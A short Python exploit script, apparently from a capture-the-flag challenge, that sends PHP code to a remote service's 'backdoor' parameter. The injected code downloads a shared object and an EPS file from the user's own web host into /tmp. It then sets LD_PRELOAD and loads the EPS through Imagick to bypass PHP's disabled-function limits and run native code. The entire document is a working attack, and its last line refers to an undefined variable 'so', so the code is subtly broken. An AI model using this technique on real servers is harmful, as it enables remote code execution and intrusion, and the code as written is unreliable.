import requests

token = "/tmp/{{HASH}}/"
host = "http://111.186.63.208:31340"
base = "http://{{MY WEB HOST}}/"

def send_backdoor(payload):
        res = requests.post(host, data={"backdoor":payload})
        return res.text

def up_file(filename):
        tp = token + filename
        rp = base + filename
        p = 'echo file_put_contents("' + tp + '", file_get_contents("' + rp + '"));'
        return send_backdoor(p)

print(up_file("bypass.so"))
print(up_file("bypass.eps"))

print(send_backdoor("putenv('LD_PRELOAD=" + token + so + "');" + "$img = new Imagick('" + token + "bypass.eps" + "');"))
